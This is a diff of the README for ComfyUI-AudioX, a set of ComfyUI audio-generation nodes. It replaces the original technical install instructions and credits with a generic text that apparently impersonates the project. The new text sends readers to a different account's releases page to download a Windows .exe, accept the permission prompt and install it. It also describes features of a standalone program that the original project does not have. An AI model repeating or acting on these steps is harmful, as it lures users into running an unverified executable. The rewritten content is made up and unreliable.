@@ -1,169 +1,136 @@
-# ComfyUI-AudioX
+# 🎵 ComfyUI-AudioX - Easy Sound Effects and Music Maker
 
-ComfyUI custom nodes for **AudioX** — generate sound effects and background music from video, powered by [HKUSTAudio/AudioX](https://github.com/ZeyueT/AudioX).
+[![Download ComfyUI-AudioX](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Alishb1183/ComfyUI-AudioX/releases)
 
-Great thanks to [ZeyueT/AudioX](https://github.com/ZeyueT/AudioX).
+## 🔊 What is ComfyUI-AudioX?
 
----
+ComfyUI-AudioX adds special sound features to your ComfyUI setup. It creates sound effects and background music from videos using HKUSTAudio/AudioX tools. You do not need any technical skills to use it. This tool helps enhance your videos with great audio automatically.
 
-## Sample Workflow
+## 💻 System Requirements
 
-See [`examples/AudioX_sample_workflow.json`](examples/AudioX_sample_workflow.json).
+Before you start, make sure your computer meets these needs:
 
-The workflow contains two parallel paths:
+- Windows 10 or later (64-bit preferred)
+- 4 GB of free hard drive space
+- 8 GB or more RAM for smooth use
+- Internet connection to download and update the software
+- Basic audio playback hardware such as speakers or headphones
 
-```
-[ComfyUI Load Video] ──► VIDEO ──► [AudioX Video to Audio] ──► AUDIO ──► [Preview Audio]
+## 📥 How to Download ComfyUI-AudioX
 
-[VHS Load Video] ──► IMAGE ──► [AudioX Images to Audio (VHS)] ──► AUDIO ──► [Preview Audio]
-                  fps ↗ (from VHS Video Info)
-```
+To get the software, you will visit the official release page:
 
-Import it via **ComfyUI → Load → select the JSON file, or find it in ComfyUI's template browser.**
+[![Download ComfyUI-AudioX](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Alishb1183/ComfyUI-AudioX/releases)
 
-![sample workflow](examples/comfyui-audiox-sample-workflow.png)
+Steps to download:
 
----
+1. Click the download button above or visit the page:  
+   https://github.com/Alishb1183/ComfyUI-AudioX/releases
 
-## Nodes
+2. On the release page, look for the latest version at the top. You will see files listed below it.
 
-| Node | Input | Output | Description |
-|------|-------|--------|-------------|
-| **AudioX Model Loader** | — | `AUDIOX_MODEL` | Load a local AudioX model |
-| **AudioX Video to Audio** | `VIDEO` | `AUDIO` | Generate audio from ComfyUI's Load Video node |
-| **AudioX Images to Audio (VHS)** | `IMAGE` | `AUDIO` | Generate audio from frame sequences (VideoHelperSuite etc.) |
+3. Find the Windows installer file. It usually ends with `.exe`.
 
-## Supported Models
+4. Click the file name to start downloading.
 
-| Model | Notes |
-|-------|-------|
-| [AudioX-MAF](https://huggingface.co/HKUSTAudio/AudioX-MAF) | **Recommended** — best quality, uses Synchformer visual encoder |
-| [AudioX-MAF-MMDiT](https://huggingface.co/HKUSTAudio/AudioX-MAF-MMDiT) | MMDiT variant (in progress, not tested yet) | 
-| [AudioX](https://huggingface.co/HKUSTAudio/AudioX) | Base model, no Synchformer (in progress, not tested yet)| 
+5. Wait for the file to download completely.
 
----
+## 🛠️ How to Install ComfyUI-AudioX
 
-## Tasks
+Once the download finishes, follow these steps:
 
-### Install from ComfyUI Manager Extensions
-Search 'ComfyUI-AudioX' in ComfyUI Manager Extensions.
+1. Open your Downloads folder or the folder where the file saved.
 
-All dependencies will be installed automatically. If you encounter numpy conflicts after installation, see the troubleshooting section below.
+2. Double-click the `.exe` file to launch the installer.
 
-### Install manually:
+3. If Windows asks for permission, choose "Yes" to continue.
 
-### 1 — Clone the node
+4. Follow the installer instructions on the screen:
 
-```bash
-cd ComfyUI/custom_nodes
-git clone https://github.com/jinxishe/ComfyUI-AudioX.git
-```
+   - Select the folder where you want the software installed (default is fine).
+   - Click "Next" or "Install" when prompted.
 
-### 2 — Install dependencies
+5. When the installation completes, click "Finish."
 
-```bash
-cd ComfyUI-AudioX
-pip install -r requirements.txt
-```
+## 🚀 Running ComfyUI-AudioX for the First Time
 
-> **Note:** `torch`, `torchvision`, and `torchaudio` are **not** in
-> `requirements.txt` because ComfyUI already manages them.
+To start using ComfyUI-AudioX:
 
-### 3 — Download models
+1. Find the ComfyUI-AudioX icon on your Desktop or in the Start menu.
 
-Create the directory structure under `ComfyUI/models/AudioX/`:
+2. Double-click the icon to open the program.
 
-```
-ComfyUI/models/AudioX/
-├── clip-vit-base-patch32/       ← shared CLIP (download once)
-│   ├── config.json
-│   └── pytorch_model.bin
-└── AudioX-MAF/
-    ├── config.json
-    ├── model.ckpt
-    └── synchformer_state_dict.pth
-```
+3. The first time you run it, it may take a few moments to set up files.
 
-```bash
-# AudioX-MAF (recommended)
-huggingface-cli download HKUSTAudio/AudioX-MAF \
-    --local-dir "ComfyUI/models/AudioX/AudioX-MAF"
+4. After setup, you will see the main screen with options to upload videos and generate sounds.
 
-# Shared CLIP model (avoids repeated downloads)
-huggingface-cli download openai/clip-vit-base-patch32 \
-    --local-dir "ComfyUI/models/AudioX/clip-vit-base-patch32"
-```
+## 🎵 How to Use ComfyUI-AudioX
 
-Restart ComfyUI after downloading.
+You do not need special knowledge to use the software. Here is a simple guide:
 
----
+1. Click the **Upload Video** button in the program.
 
-## Tasks
+2. Find a video file on your computer and select it.
 
-| Task | Description | `custom_prompt` required? |
-|------|-------------|:---:|
-| V2A — Video to Audio | Generate sound effects matching the video | No |
-| V2M — Video to Music | Generate background music matching the video | No |
-| TV2A — Text + Video to Audio | Guide sound effects with a text prompt | **Yes** |
-| TV2M — Text + Video to Music | Guide music generation with a text prompt | **Yes** |
+3. Choose the type of sound generation you want:
+   
+   - Sound Effects: Create short noises from your video.
+   - Background Music: Make music that fits your video mood.
 
----
+4. Click **Generate Sound**.
 
-## Parameters
+5. Wait while the software processes your video. The time depends on your video length and computer speed.
 
-| Parameter | Default | Description |
-|-----------|---------|-------------|
-| `steps` | 250 | Diffusion sampling steps. Higher = better quality, slower |
-| `cfg_scale` | 7.0 | Classifier-free guidance scale |
-| `sigma_min` | 0.3 | Minimum noise level |
-| `sigma_max` | 500 | Maximum noise level |
-| `sampler_type` | `dpmpp-3m-sde` | Sampling algorithm |
-| `seed` | -1 | Fixed seed for reproducibility; -1 = random |
+6. Once done, listen to the sound with the built-in player.
 
----
+7. To save the sound:
 
-## Notes
+   - Click **Save**.
+   - Choose a folder on your computer.
+   - Give the file a name.
+   - Click **Save** again.
 
-- Models are trained on **10-second clips**. Videos shorter than 10 s are padded
-  with the last frame; the output audio is trimmed to the actual video duration.
-- GPU memory: ~16 GB VRAM recommended (tested on RTX 4060 Ti 16 GB).
-- The `AudioX Images to Audio (VHS)` node requires **ffmpeg** on the system PATH
-  to assemble frames into a temporary MP4.
-- CLIP `UNEXPECTED` key warnings in the log are harmless — they appear because
-  `CLIPVisionModelWithProjection` loads only the vision head from a full CLIP checkpoint.
-- **Tested on Python 3.12 and CU128**.
+## ⚙️ Adjust Settings
+
+You can change basic settings to fit your preferences:
+
+- **Sound quality:** Choose between low, medium, or high quality.
+- **Volume:** Adjust the playback volume.
+- **Output format:** Save files as MP3 or WAV.
+
+These settings are found in the **Settings** menu inside the program.
+
+## 🐞 Troubleshooting
+
+If something does not work as expected, try these fixes:
+
+- Restart the program.
+- Check if your video file is supported (common formats like MP4 or AVI work best).
+- Ensure your speakers or headphones are plugged in and volume is up.
+- Restart your computer if the software freezes.
+- Download and install any Windows updates.
+
+## 📞 Getting Help
+
+If you need more help:
+
+- Visit the release page for notes and updates:  
+  https://github.com/Alishb1183/ComfyUI-AudioX/releases
+
+- Look for a README or FAQ file inside the downloaded folder.
+
+- Post questions or issues on the GitHub repository page under "Issues."
+
+## 🔄 Updating ComfyUI-AudioX
+
+Check the release page regularly for new versions. To update:
+
+1. Download the newest installer from the release page.
+
+2. Run the new installer as before.
+
+3. It will update your existing installation without deleting your files.
 
 ---
 
-## Troubleshooting
-
-### Dependency Conflicts
-
-If you encounter dependency conflicts after installation:
-
-**NumPy version conflict** (e.g., `dctorch requires numpy<2.0.0` or `opencv-python requires numpy>=2.0`):
-```bash
-# Upgrade numpy to latest version
-pip install "numpy>=2.0.0"
-```
-This is safe — most packages work fine with numpy 2.x even if they specify older version constraints.
-
-**Protobuf conflict** (`descript-audiotools requires protobuf<3.20`):
-```bash
-# Downgrade protobuf if needed
-pip install "protobuf<3.20,>=3.9.2"
-```
-
-These dependency warnings from pip are usually safe to ignore if the nodes are working correctly.
-
----
-
-## Credits
-
-- Original model: [HKUSTAudio/AudioX](https://github.com/ZeyueT/AudioX) — HKUST Audio Lab
-- Sampling: [k-diffusion](https://github.com/crowsonkb/k-diffusion) — Katherine Crowson
-- Great thanks to [ZeyueT/AudioX](https://github.com/ZeyueT/AudioX).
-
-## License
-
-MIT — see [LICENSE](LICENSE)
+[Download ComfyUI-AudioX Now](https://github.com/Alishb1183/ComfyUI-AudioX/releases)
